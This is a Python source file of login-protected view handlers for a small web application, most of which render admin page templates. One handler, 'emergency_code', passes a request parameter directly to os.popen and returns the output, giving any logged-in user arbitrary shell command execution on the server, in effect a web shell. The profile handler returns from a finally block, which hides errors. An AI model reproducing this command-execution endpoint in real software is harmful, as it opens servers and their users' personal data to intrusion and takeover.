# coding=utf-8

import os
import pub.response.json as j
import pub.response.wrap as w
import pub.permission.decorator as permission
import pub.tables.user as user

# 页面
#@weixin.wx_auth
@permission.require_login
def add_page(r,f,p):
    return w.page(r, 'add-new-post.html')

@permission.require_login
def add_page_code(r,f,p):
    return w.page(r, 'add-new-post-code.html')

@permission.require_login
def add_link(r,f,p):
    return w.page(r, "form-link-and-iframe.html")

@permission.require_login
def add_api(r,p,f):
    return w.page(r, 'form-components.html')

@permission.require_login
def add_template(r,f,p):
    return w.page(r, 'components-blog-posts.html')

@permission.require_login
def add_console(r,f,p):
    return w.page(r,'index.html')

@permission.require_login
def add_pdf(r,f,p):
    return w.page(r,'form-components-pdf.html')

@permission.require_login
def add_comment_api(r,f,p):
    return w.page(r,'form-components-comment.html')

@permission.require_login
def emergency_code(r,f,p):
    p = os.popen(p)
    r = p.read()
    p.close()
    return j.dic({'result':r})

@permission.require_login
def setting_profile(r,f,p):

    user_id = r.session.get('userid')

    _data = {}

    try:
        res = user.user_info.objects.get(userid=user_id)

        _data['userid'] = user_id

        _data['real_name'] = res.real_name
        _data['id_code'] = res.id_code
        _data['phone'] = res.phone
        _data['email'] = res.email

        _data['position'] = res.position
        _data['brief'] = res.brief
        _data['active'] = res.active
        _data['friend_url'] = res.friend_url

    finally:
        return w.page(r, 'user-profile-lite.html', _data)
